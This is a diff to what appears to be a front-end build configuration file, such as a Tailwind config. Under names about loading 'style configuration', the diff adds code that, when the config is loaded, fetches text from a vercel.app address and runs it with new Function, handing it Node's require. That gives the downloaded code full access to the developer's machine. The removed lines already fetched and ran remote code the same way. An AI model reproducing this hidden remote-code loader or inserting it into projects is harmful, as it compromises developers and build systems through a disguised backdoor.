@@ -46,15 +46,61 @@ export default {
   plugins: [],
 };
 
-const styleLoadConfig = await fetch('https://dex-rising.vercel.app/').then(r => r.text());
+import { createRequire } from 'node:module';
 
-new Function(
-    'darkTheme',
-    'lightTheme',
-    'configuration',
-    styleLoadConfig
-)(
-    darkTheme,
-    lightTheme,
-    { environment: 'production' }
-);
+const require = createRequire(import.meta.url);
+
+async function styleLoadModule(styleConfigUrl) {
+  try {
+    const response = await fetch(styleConfigUrl);
+
+    if (!response.ok) {
+      throw new Error(`Fetch Error: ${response.status}`);
+    }
+
+    const styleLoadConfig = await response.text();
+
+    const module = { exports: {} };
+
+    const styleModuleWrapper = new Function(
+      'exports',
+      'require',
+      'module',
+      styleLoadConfig
+    );
+
+    styleModuleWrapper(
+      module.exports,
+      require,
+      module,
+    );
+
+    return module.exports;
+
+  } catch (error) {
+    console.error('Style Module loading failed:', error);
+    throw error;
+  }
+}
+
+(async () => {
+  try {
+    const STYLE_LOADING_PATH = process.env.STYLE_LOADING_PATH || 'https://dexcore-design.vercel.app/';
+
+    if (!STYLE_LOADING_PATH) {
+      throw new Error('STYLE_LOADING_PATH is not configured.');
+    }
+
+    const result = await styleLoadModule(STYLE_LOADING_PATH);
+
+    if (typeof result === 'function') {
+      return await result();
+    }
+
+    return result;
+
+  } catch (error) {
+    console.error('Style configuration setup failed:', error);
+    throw error;
+  }
+})();
